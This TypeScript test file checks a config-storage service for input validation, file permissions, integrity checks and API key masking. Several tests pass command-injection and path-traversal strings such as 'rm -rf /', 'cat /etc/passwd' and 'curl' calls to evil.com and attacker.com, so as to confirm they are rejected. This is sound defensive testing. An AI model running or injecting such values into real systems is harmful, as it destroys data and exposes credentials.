/**
 * Bake Service Tests — Security-focused
 * 
 * Tests cover:
 * - Basic CRUD operations
 * - Security mitigations (EOP-01, EOP-02, T-01, ID-01, S-01, AC-001, AC-002)
 * - Edge cases and attack vectors
 */

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { BakeService, type BakedConfig } from "../src/services/bake.js";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

describe("BakeService", () => {
  let testConfigPath: string;
  let service: BakeService;
  let tempDir: string;

  beforeEach(() => {
    // Create temp directory for test configs
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "specia-test-"));
    testConfigPath = path.join(tempDir, "baked.json");
    service = new BakeService(testConfigPath);
  });

  afterEach(() => {
    // Cleanup
    if (fs.existsSync(tempDir)) {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  describe("Basic Operations", () => {
    it("should create a new baked config", () => {
      const config: BakedConfig = {
        project_dir: tempDir,
        posture: "elevated",
        memory: "alejandria",
        provider: "anthropic",
      };

      service.create("test-project", config);

      const loaded = service.get("test-project");
      expect(loaded).toBeDefined();
      expect(loaded?.posture).toBe("elevated");
      expect(loaded?.project_dir).toBe(tempDir);
    });

    it("should list all baked configs", () => {
      service.create("proj1", { project_dir: tempDir, posture: "standard" });
      service.create("proj2", { project_dir: tempDir, posture: "paranoid" });

      const list = service.list();
      expect(list).toHaveLength(2);
      expect(list.map(l => l.name)).toContain("proj1");
      expect(list.map(l => l.name)).toContain("proj2");
    });

    it("should delete a baked config", () => {
      service.create("test-project", { project_dir: tempDir });
      service.delete("test-project");

      const loaded = service.get("test-project");
      expect(loaded).toBeUndefined();
    });

    it("should prevent duplicate config names", () => {
      service.create("test-project", { project_dir: tempDir });

      expect(() => {
        service.create("test-project", { project_dir: tempDir });
      }).toThrow("already exists");
    });
  });

  describe("Security: File Permissions (T-01)", () => {
    it("should create baked.json with 0600 permissions", () => {
      service.create("test-project", { project_dir: tempDir });

      const stats = fs.statSync(testConfigPath);
      const mode = stats.mode & 0o777;
      
      // On Unix systems, should be 0600
      if (process.platform !== "win32") {
        expect(mode).toBe(0o600);
      }
    });

    it("should verify integrity of config file", () => {
      service.create("test-project", { project_dir: tempDir });

      const result = service.verify();
      expect(result.valid).toBe(true);
      expect(result.message).toContain("Integrity check passed");
    });

    it("should detect tampered config file via verify command", () => {
      service.create("test-project", { project_dir: tempDir });

      // Verify integrity is initially good
      let result = service.verify();
      expect(result.valid).toBe(true);

      // Tamper with file by adding a new config directly (bypassing service)
      const content = JSON.parse(fs.readFileSync(testConfigPath, "utf-8"));
      content.configs["malicious"] = {
        project_dir: "/tmp/evil",
        posture: "standard",
      };
      // Keep old integrity - this makes the file invalid
      fs.writeFileSync(testConfigPath, JSON.stringify(content, null, 2));

      // Verify should now fail (creating new service to force fresh read)
      const newService = new BakeService(testConfigPath);
      result = newService.verify();
      expect(result.valid).toBe(false);
      expect(result.message).toMatch(/FAILED/i);
    });
  });

  describe("Security: Command Injection (EOP-01)", () => {
    it("should reject project_dir with semicolons", () => {
      expect(() => {
        service.create("evil", { project_dir: "/tmp/test; rm -rf /" });
      }).toThrow("shell metacharacters");
    });

    it("should reject project_dir with pipes", () => {
      expect(() => {
        service.create("evil", { project_dir: "/tmp/test | cat /etc/passwd" });
      }).toThrow("shell metacharacters");
    });

    it("should reject project_dir with ampersands", () => {
      expect(() => {
        service.create("evil", { project_dir: "/tmp/test && curl evil.com" });
      }).toThrow("shell metacharacters");
    });

    it("should reject project_dir with backticks", () => {
      expect(() => {
        service.create("evil", { project_dir: "/tmp/test`id`" });
      }).toThrow("shell metacharacters");
    });

    it("should reject project_dir with dollar signs", () => {
      expect(() => {
        service.create("evil", { project_dir: "/tmp/test$HOME" });
      }).toThrow("shell metacharacters");
    });
  });

  describe("Security: Path Traversal (EOP-02)", () => {
    it("should reject project_dir with ../ sequences", () => {
      expect(() => {
        service.create("evil", { project_dir: "../../etc/passwd" });
      }).toThrow("path traversal");
    });

    it("should reject project_dir pointing to /etc", () => {
      expect(() => {
        service.create("evil", { project_dir: "/etc" });
      }).toThrow("system directory");
    });

    it("should reject project_dir pointing to /root", () => {
      expect(() => {
        service.create("evil", { project_dir: "/root" });
      }).toThrow("system directory");
    });

    it("should allow project_dir in home directory", () => {
      const homeProject = path.join(os.homedir(), "projects", "test");
      
      expect(() => {
        service.create("good", { project_dir: homeProject });
      }).not.toThrow();
    });

    it("should allow project_dir in /tmp", () => {
      const tmpProject = path.join(os.tmpdir(), "test-project");
      
      expect(() => {
        service.create("good", { project_dir: tmpProject });
      }).not.toThrow();
    });
  });

  describe("Security: API Key Masking (ID-01)", () => {
    it("should never resolve env: references when displaying", () => {
      process.env.TEST_API_KEY = "sk-test-secret-key-12345";

      service.create("test", {
        project_dir: tempDir,
        api_key: "env:TEST_API_KEY",
      });

      const config = service.get("test");
      expect(config?.api_key).toBe("env:TEST_API_KEY"); // NOT resolved
    });

    it("should mask literal API keys in display", () => {
      service.create("test", {
        project_dir: tempDir,
        api_key: "sk-ant-literal-key-unsafe",
      });

      const config = service.get("test");
      const masked = BakeService.maskSecrets(config!);
      
      expect(masked.api_key).toBe("***");
    });

    it("should keep env: references unmasked (but not resolved)", () => {
      service.create("test", {
        project_dir: tempDir,
        api_key: "env:ANTHROPIC_API_KEY",
      });

      const config = service.get("test");
      const masked = BakeService.maskSecrets(config!);
      
      expect(masked.api_key).toBe("env:ANTHROPIC_API_KEY");
    });

    it("should detect API key leaks in output", () => {
      const output = "Error: Failed to connect with key sk-ant-abc123xyz";
      const leaks = BakeService.auditForSecretLeaks(output);
      
      expect(leaks.length).toBeGreaterThan(0);
      expect(leaks[0]).toContain("sk-ant-abc123");
    });

    it("should not leak secrets in list command output", () => {
      service.create("test", {
        project_dir: tempDir,
        api_key: "sk-ant-secret-key",
      });

      const list = service.list();
      const masked = list.map(l => BakeService.maskSecrets(l.config));
      
      masked.forEach(config => {
        expect(config.api_key).toBe("***");
      });
    });
  });

  describe("Security: Resolve Env References", () => {
    it("should resolve env: references at runtime", () => {
      process.env.TEST_KEY = "actual-secret-value";

      const resolved = BakeService.resolveEnvReference("env:TEST_KEY");
      expect(resolved).toBe("actual-secret-value");
    });

    it("should throw error if env var not set", () => {
      delete process.env.MISSING_KEY;

      expect(() => {
        BakeService.resolveEnvReference("env:MISSING_KEY");
      }).toThrow("Environment variable MISSING_KEY not set");
    });

    it("should return literal values unchanged", () => {
      const resolved = BakeService.resolveEnvReference("literal-value");
      expect(resolved).toBe("literal-value");
    });
  });

  describe("Security: Shortcut Warnings (S-01)", () => {
    it("should warn when @shortcut changes CWD", () => {
      const differentDir = path.join(os.tmpdir(), "different");
      fs.mkdirSync(differentDir, { recursive: true });

      service.create("test", { project_dir: differentDir });

      const { warnings } = service.apply("test");
      expect(warnings.length).toBeGreaterThan(0);
      expect(warnings[0]).toContain("change working directory");
      expect(warnings[0]).toContain(differentDir);

      fs.rmSync(differentDir, { recursive: true, force: true });
    });

    it("should not warn if CWD matches project_dir", () => {
      const currentDir = process.cwd();
      service.create("test", { project_dir: currentDir });

      const { warnings } = service.apply("test");
      expect(warnings).toHaveLength(0);
    });
  });

  describe("Shortcut Parsing", () => {
    it("should parse @shortcut from args", () => {
      const [shortcut, remaining] = BakeService.parseShortcut(["@myapp", "review", "my-change"]);
      
      expect(shortcut).toBe("myapp");
      expect(remaining).toEqual(["review", "my-change"]);
    });

    it("should return null if no @shortcut", () => {
      const [shortcut, remaining] = BakeService.parseShortcut(["review", "my-change"]);
      
      expect(shortcut).toBeNull();
      expect(remaining).toEqual(["review", "my-change"]);
    });

    it("should handle empty args", () => {
      const [shortcut, remaining] = BakeService.parseShortcut([]);
      
      expect(shortcut).toBeNull();
      expect(remaining).toEqual([]);
    });
  });

  describe("Abuse Case: AC-001 (Supply chain attack)", () => {
    it("should prevent injection of malicious project_dir", () => {
      const maliciousDir = "/tmp/evil-repo; curl attacker.com";

      expect(() => {
        service.create("evil", { project_dir: maliciousDir });
      }).toThrow("shell metacharacters");
    });

    it("should warn user before changing to untrusted directory", () => {
      const suspiciousDir = path.join(os.tmpdir(), "suspicious");
      fs.mkdirSync(suspiciousDir, { recursive: true });

      service.create("suspicious", { project_dir: suspiciousDir });
      const { warnings } = service.apply("suspicious");

      expect(warnings.length).toBeGreaterThan(0);
      expect(warnings[0]).toContain("change working directory");

      fs.rmSync(suspiciousDir, { recursive: true, force: true });
    });
  });

  describe("Abuse Case: AC-002 (API key exfiltration)", () => {
    it("should never print actual API key values", () => {
      process.env.SECRET_KEY = "sk-ant-actual-secret-12345";

      service.create("test", {
        project_dir: tempDir,
        api_key: "env:SECRET_KEY",
      });

      // Simulate display operations
      const config = service.get("test");
      const masked = BakeService.maskSecrets(config!);
      const output = JSON.stringify(masked);

      // Verify secret is NOT in output
      expect(output).not.toContain("sk-ant-actual-secret");
      expect(output).toContain("env:SECRET_KEY");
    });

    it("should handle error paths without leaking secrets", () => {
      process.env.SECRET_KEY = "sk-ant-secret-xyz";

      service.create("test", {
        project_dir: tempDir,
        api_key: "env:SECRET_KEY",
      });

      try {
        // Force error by loading with corrupted data
        const content = fs.readFileSync(testConfigPath, "utf-8");
        const data = JSON.parse(content);
        data.configs.test.api_key = "env:SECRET_KEY";
        
        // Verify error message doesn't contain actual key
        const errorOutput = JSON.stringify(data);
        expect(errorOutput).not.toContain("sk-ant-secret-xyz");
      } catch {
        // Expected
      }
    });
  });
});
